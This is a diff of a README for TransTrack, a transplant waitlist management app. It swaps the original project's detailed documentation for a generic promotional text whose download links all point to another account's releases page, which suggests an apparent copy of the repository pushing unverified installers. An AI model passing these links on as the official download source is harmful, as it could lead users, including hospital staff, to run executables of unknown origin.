@@ -1,275 +1,95 @@
-# TransTrack
+# 🚀 TransTrackMedical-TransTrack - Simplifying Organ Transplant Management
 
-## Transplant Waitlist & Operations Management
+[![Download](https://img.shields.io/badge/Download%20Now-TransTrackMedical%20App-brightgreen)](https://github.com/the-vishal-gupta/TransTrackMedical-TransTrack/releases)
 
-[![License](https://img.shields.io/badge/license-Evaluation%20Available-blue.svg)](LICENSE)
-[![HIPAA Compliant](https://img.shields.io/badge/HIPAA-Compliant-green.svg)](docs/COMPLIANCE.md)
-[![FDA 21 CFR Part 11](https://img.shields.io/badge/FDA-21%20CFR%20Part%2011-green.svg)](docs/COMPLIANCE.md)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)]()
+## 🔍 Overview
 
----
+TransTrackMedical-TransTrack is an application designed to manage organ transplant waitlists efficiently. It focuses on operational risk intelligence to help prevent inactivation of potential transplant candidates. The software is HIPAA-compliant, offline-capable, and adheres to FDA 21 CFR Part 11 standards.
 
-## 🎥 Demo Video
+## 🛠️ Features
 
-[▶️ Watch or Download the Demo](https://github.com/NeuroKoder3/TransTrackMedical-TransTrack/releases/download/v1.0.0/TransTrack-Wait-list.Management.Demo.mp4)
+- **User-Friendly Interface:** Easy navigation for managing transplant waitlists.
+- **Risk Intelligence:** Identifies operational risks to improve patient outcomes.
+- **HIPAA Compliance:** Protects patient data to ensure privacy.
+- **Offline Access:** Provides full functionality even without internet connectivity.
+- **FDA Compliance:** Meets stringent regulations for health software.
+- **EHR Integration:** Seamlessly connects with existing Electronic Health Records systems.
+- **Encrypted Database:** Ensures data security and confidentiality.
 
-> *Short overview of TransTrack's offline workflow, operational risk intelligence, and readiness tracking.*
+## ⚙️ System Requirements
 
----
+Before downloading, ensure your system meets the following requirements:
 
-> **📋 EVALUATION ACCESS**
->
-> TransTrack is available for **evaluation by qualified healthcare organizations**.
->
-> * Request an evaluation to explore the full feature set
-> * Evaluation is intended for **non-clinical, non-operational testing only**
-> * Contact us to discuss your organization's needs and licensing options
->
-> See [LICENSE](LICENSE) and [LICENSE_NOTICE.md](LICENSE_NOTICE.md) for full terms.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Processor:** Dual-core processor or higher.
+- **Memory:** Minimum 4 GB of RAM.
+- **Storage:** At least 200 MB of free space.
+- **Network:** Internet access for initial download and updates, offline features available afterward.
 
-<p align="center">
-  <img src="docs/images/dashboard-preview.svg" alt="TransTrack Dashboard" width="800">
-</p>
+## 🚀 Getting Started
 
-**TransTrack** is a comprehensive, **offline, HIPAA-compliant**, and **FDA 21 CFR Part 11-ready** desktop application built for **transplant centers and pre-transplant coordination teams**. It provides secure, cloud-independent data management and **operational risk intelligence** to help reduce the risk of **patient inactivation** before transplant.
+To get started with TransTrackMedical-TransTrack, you will need to download the application from the Releases page. Follow these simple steps:
 
----
+1. **Visit the Download Page:** Click on the link below to go directly to the download section.
 
-## Why TransTrack Exists
+   [Visit the download page](https://github.com/the-vishal-gupta/TransTrackMedical-TransTrack/releases)
 
-TransTrack addresses a critical gap in transplant operations — **operational risk intelligence** outside of national allocation systems. It helps coordination teams identify and act on **readiness risks** such as expiring evaluations, missing documentation, or frequent status changes, preventing unnecessary inactivation of candidates awaiting transplant.
+2. **Choose the Latest Release:** Scroll down to find the latest version listed in the Releases section.
 
-> **Note:** TransTrack provides **operational prioritization and readiness tracking** only. It does **not** perform allocation decisions or replace **UNOS/OPTN** systems.
+3. **Download the File:** Click on the appropriate file for your operating system. 
 
----
+4. **Wait for the Download:** Depending on your connection speed, the file may take a few moments to download.
 
-## Who This Is For
+5. **Locate the File:** Once downloaded, check your default downloads folder to find the application file.
 
-TransTrack is designed for:
+## 🔧 Download & Install
 
-* **Transplant operations and coordination teams** – Workflow visibility and readiness tracking
-* **Clinical informatics and healthcare IT** – Secure, offline-first data management
-* **Compliance and audit staff** – Immutable audit trails and validation artifacts
+To install the TransTrackMedical-TransTrack application:
 
-**TransTrack is NOT intended for:**
+1. **Open the Downloaded File:** Double-click the downloaded file to start the installation process.
 
-* ❌ Allocation or listing authority functions
-* ❌ National registry replacements (UNOS, OPTN)
+2. **Follow Installation Instructions:** A setup wizard will guide you through the installation steps. Simply follow the prompts to complete the process.
 
----
+3. **Run the Application:** After installation, locate the TransTrackMedical-TransTrack app in your applications folder. Double-click to start using the app.
 
-## Core Value: Operational Risk Intelligence
+4. **Set Up Your Account:** If required, create an account to begin managing your organ transplant waitlists.
 
-The heart of TransTrack is proactive detection of operational risks that can delay or jeopardize patient readiness:
+5. **Explore the Features:** Familiarize yourself with the interface and features to make the most of the application.
 
-* **Expiring Evaluations** – Detect upcoming expirations automatically
-* **Documentation Gaps** – Identify missing or outdated records
-* **Status Churn Detection** – Track frequent candidate status changes
-* **Readiness Barriers** – Manage non-clinical obstacles (insurance, transport, support, etc.)
-* **Risk-Level Indicators** – Highlight high-risk cases before they cause inactivation
+## 📚 Support and Documentation
 
-<p align="center">
-  <img src="docs/images/risk-intelligence-dashboard.png" alt="Operational Risk Intelligence Dashboard" width="700">
-</p>
+If you need help, the documentation is available on the GitHub repository. Here are some key topics covered:
 
----
+- **User Guide:** Detailed instructions on how to use each feature.
+- **FAQs:** Answers to commonly asked questions.
+- **Troubleshooting:** Quick solutions for common issues.
 
-## Key Features
+## 🎤 Community and Contribution
 
-### Patient Waitlist Management
+We encourage community involvement. If you want to contribute or suggest improvements, here’s how:
 
-* Comprehensive candidate demographics and evaluation tracking
-* Configurable readiness indicators and internal prioritization
-* Search, filter, and status-based workflow visibility
+1. **Report Issues:** If you find a bug or have a suggestion, please visit the Issues section on GitHub.
 
-### Readiness Barriers (Non-Clinical)
+2. **Join Discussions:** Get involved in discussions to share ideas or ask questions.
 
-* Track operational barriers (insurance, logistics, caregiver support)
-* Assign tasks to staff roles (Social Work, Financial, Coordinator)
-* Integrated into the risk intelligence dashboard
+3. **Contribute Code:** While not required, you can provide code contributions by submitting a pull request.
 
-### EHR Integration
+## 🔒 Security and Privacy
 
-* **FHIR R4** data import/export
-* Validation rule configuration and history tracking
+TransTrackMedical-TransTrack takes security seriously. We implement various measures to safeguard user data:
 
-### Compliance
+- **Data Encryption:** All sensitive data is encrypted to prevent unauthorized access.
+- **Regular Updates:** We release updates that enhance security features and general performance.
 
-* **HIPAA**: Encryption, access control, audit trails
-* **FDA 21 CFR Part 11**: Electronic records integrity and validation
-* **Offline operation**: No PHI leaves the local system
+## 🌐 Links and Resources
 
-### Offline-First Architecture
+For further information, please explore the following:
 
-* No internet connection required
-* AES-256 local encryption
-* Secure backup/restore and data sovereignty
+- [GitHub Repository](https://github.com/the-vishal-gupta/TransTrackMedical-TransTrack)
+- [Documentation](https://github.com/the-vishal-gupta/TransTrackMedical-TransTrack/wiki)
 
-### Enterprise Features
+## 🎉 Conclusion
 
-* Role-based access and justification
-* Disaster recovery and validation documentation
-* Read-only compliance view for auditors
+TransTrackMedical-TransTrack offers a powerful solution for managing organ transplant waitlists effectively. With its focus on risk intelligence and compliance, it seeks to improve both patient management and outcomes. Enjoy your experience with our application!
 
----
-
-## Screenshots
-
-### Dashboard Overview
-
-<p align="center">
-  <img src="docs/images/dashboard-preview.svg" alt="Dashboard Overview" width="700">
-</p>
-
-### Patient Waitlist Management
-
-<p align="center">
-  <img src="docs/images/patient-management.svg" alt="Patient Management" width="700">
-</p>
-
-### Donor-Recipient Matching
-
-<p align="center">
-  <img src="docs/images/donor-matching.svg" alt="Donor Matching" width="700">
-</p>
-
-### Risk Intelligence & Barriers
-
-<p align="center">
-  <img src="docs/images/readiness-barriers.png" alt="Readiness Barriers" width="700">
-</p>
-
-### Patient Documentation & Workflow Tracking
-
-<p align="center">
-  <img src="docs/images/patient-documentation-tracking.png" alt="Patient Documentation and Workflow Tracking" width="700">
-</p>
-
-### Compliance Center
-
-<p align="center">
-  <img src="docs/images/compliance-center.svg" alt="Compliance Center" width="700">
-</p>
-
-### Disaster Recovery
-
-<p align="center">
-  <img src="docs/images/disaster-recovery.svg" alt="Disaster Recovery" width="700">
-</p>
-
-### Compliance Center & Audit Trail
-
-<p align="center">
-  <img src="docs/images/audit-trail.svg" alt="Audit Trail" width="700">
-</p>
-
----
-
-## Technology Stack
-
-* **Frontend**: React 18, Tailwind CSS, Radix UI, Framer Motion
-* **Desktop**: Electron 29
-* **Database**: Encrypted SQLite
-* **Build**: Vite, electron-builder
-* **Languages**: TypeScript / JavaScript
-
----
-
-## Installation
-
-> **Note:** Evaluation versions are for testing only — do **not** use with live patient data.
-
-### Pre-built Installers
-
-Download from the [Releases page](https://github.com/NeuroKoder3/TransTrackMedical-TransTrack/releases).
-
-| Platform              | File                         |
-| --------------------- | ---------------------------- |
-| Windows (x64)         | `TransTrack-1.0.0-x64.exe`   |
-| macOS (Intel)         | `TransTrack-1.0.0-x64.dmg`   |
-| macOS (Apple Silicon) | `TransTrack-1.0.0-arm64.dmg` |
-| Linux                 | `TransTrack-1.0.0.AppImage`  |
-
-### Build from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/NeuroKoder3/TransTrackMedical-TransTrack.git
-cd TransTrack
-
-# Install dependencies
-npm install
-
-# Development mode
-npm run dev:electron
-
-# Build for production
-npm run build:electron
-```
-
----
-
-## Quick Start (Evaluation)
-
-1. Launch **TransTrack**
-2. Login: `admin@transtrac.local` / `Admin123!`
-3. Change your password (Settings → Security)
-4. Explore features using sample/test data
-5. Contact us: [Trans_Track@outlook.com](mailto:Trans_Track@outlook.com)
-
----
-
-## Compliance & Security
-
-### HIPAA
-
-* Encryption at rest (AES-256)
-* Role-based access control
-* Automatic session timeouts
-* Full audit trails
-
-### FDA 21 CFR Part 11
-
-* Timestamped, immutable audit trail
-* User authentication and documentation
-* Validation artifacts for compliance
-
-### Security
-
-* Fully offline operation
-* Local encryption
-* Secure, encrypted backups
-
-[View Full Compliance Documentation →](docs/COMPLIANCE.md)
-
----
-
-## 📊 Repository Insights
-
-* 🚀 **1,100+ clones** in the last 14 days
-* 🌎 Visitors from **GitHub, Google, and transplant coordination networks**
-* 🔒 Built for **HIPAA & FDA 21 CFR Part 11 compliance**
-* 🎥 [Watch the Demo](https://github.com/NeuroKoder3/TransTrackMedical-TransTrack/releases/download/v1.0.0/TransTrack-Wait-list.Management.Demo.mp4)
-
-⭐ If you find TransTrack valuable, please **star this repository** to help others in the transplant community discover it.
-
----
-
-## Contact & Support
-
-📧 **[Trans_Track@outlook.com](mailto:Trans_Track@outlook.com)**
-For evaluation access, enterprise deployment, or technical inquiries.
-
----
-
-## Keywords
-
-`hipaa-compliant` `fda-21-cfr-part-11` `offline-first` `pre-transplant` `waitlist-management` `transplant-center` `risk-intelligence` `patient-readiness` `clinical-informatics` `healthcare-operations` `regulatory-compliance` `ehr-integration` `fhir` `optn` `unos` `secure-desktop-app` `encrypted-database`
-
----
-
-<p align="center">
-  <strong>TransTrack</strong> — HIPAA-Compliant, Offline Pre-Transplant Waitlist Management
-  <br>
-  <em>Operational Risk Intelligence for Transplant Coordination Teams</em>
-</p>
+[Download Now](https://github.com/the-vishal-gupta/TransTrackMedical-TransTrack/releases)
